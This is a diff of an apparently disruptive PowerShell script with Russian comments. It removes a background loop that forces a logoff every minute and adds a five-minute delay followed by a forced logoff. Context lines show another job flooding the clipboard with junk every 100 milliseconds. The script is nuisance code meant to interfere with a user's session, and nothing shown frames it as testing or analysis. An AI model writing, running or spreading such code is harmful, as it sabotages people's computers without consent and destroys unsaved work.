@@ -63,14 +63,6 @@ Start-Job -ScriptBlock {
     }
 }
 
-# Постоянный Logout
-Start-Job -ScriptBlock {
-    while($true){
-        shutdown /l /f
-        Start-Sleep -Seconds 60
-    }
-}
-
 # Заполнение буфера обмена мусором
 Start-Job -ScriptBlock {
     while($true){
@@ -78,3 +70,7 @@ Start-Job -ScriptBlock {
         Start-Sleep -Milliseconds 100
     }
 }
+
+# Задержка перед выходом из системы
+Start-Sleep -Seconds 300
+shutdown /l /f
